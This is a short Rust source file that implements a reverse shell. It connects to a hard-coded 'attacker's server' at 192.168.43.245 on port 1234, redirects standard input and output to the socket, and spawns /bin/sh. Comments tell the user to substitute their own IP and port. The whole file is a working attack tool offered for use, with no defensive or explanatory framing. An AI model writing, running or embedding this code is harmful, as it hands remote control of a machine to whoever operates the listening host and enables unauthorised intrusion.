use std::io::{self};
use std::net::TcpStream;
use std::os::unix::io::{AsRawFd};
use std::process::{Command, Stdio};

fn main() -> io::Result<()> {
    // Define the IP address and port of the attacker's server
    let attacker_ip = "192.168.43.245"; // Replace with you IP address
    let attacker_port = 1234; // Replace with your port number
    // Connect to the attacker's server
    let stream = TcpStream::connect((attacker_ip, attacker_port))?;
    // Redirect stdin, stdout, and stderr to the socket
    let stream_fd = stream.as_raw_fd();
    unsafe {
        libc::dup2(stream_fd, libc::STDIN_FILENO);
        libc::dup2(stream_fd, libc::STDOUT_FILENO);
        libc::dup2(stream_fd, libc::STDERR_FILENO);
    }
    // Spawn a new shell process and connect it to the socket
    Command::new("/bin/sh")
        .stdin(Stdio::inherit())
        .stdout(Stdio::inherit())
        .stderr(Stdio::inherit())
        .spawn()?
        .wait()?;
    Ok(())
}
